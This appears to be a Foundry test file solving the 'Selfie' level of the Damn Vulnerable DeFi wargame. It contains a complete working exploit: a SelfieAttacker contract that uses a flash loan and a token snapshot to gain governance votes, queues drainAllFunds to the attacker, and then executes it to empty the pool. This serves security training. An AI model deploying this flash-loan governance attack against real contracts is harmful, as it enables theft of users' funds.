// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        SelfieAttacker selfieAttacker =
            new SelfieAttacker(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
        selfieAttacker.attack(); // Use flashloan to take a ERC20 snapshot to acquire enough votes.
        vm.warp(block.timestamp + 2 days); // 2 days
        SimpleGovernance(simpleGovernance).executeAction(selfieAttacker.getActionId());
        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract SelfieAttacker {
    address selfiePool;
    address simpleGovernance;
    address dvtSnapshot;
    address attacker;
    uint256 actionId;

    constructor(address selfiePool_, address simpleGovernance_, address dvtSnapshot_) {
        selfiePool = selfiePool_;
        simpleGovernance = simpleGovernance_;
        dvtSnapshot = dvtSnapshot_;
        attacker = msg.sender;
    }

    function attack() external payable {
        SelfiePool(selfiePool).flashLoan(1_500_000e18);
    }

    function receiveTokens(address token, uint256 amount) external {
        require(msg.sender == selfiePool, "selfiePool only");
        DamnValuableTokenSnapshot(dvtSnapshot).snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = SimpleGovernance(simpleGovernance).queueAction(selfiePool, data, 0);
        DamnValuableTokenSnapshot(token).transfer(selfiePool, 1_500_000e18);
    }

    function getActionId() external returns (uint256) {
        return actionId;
    }
}
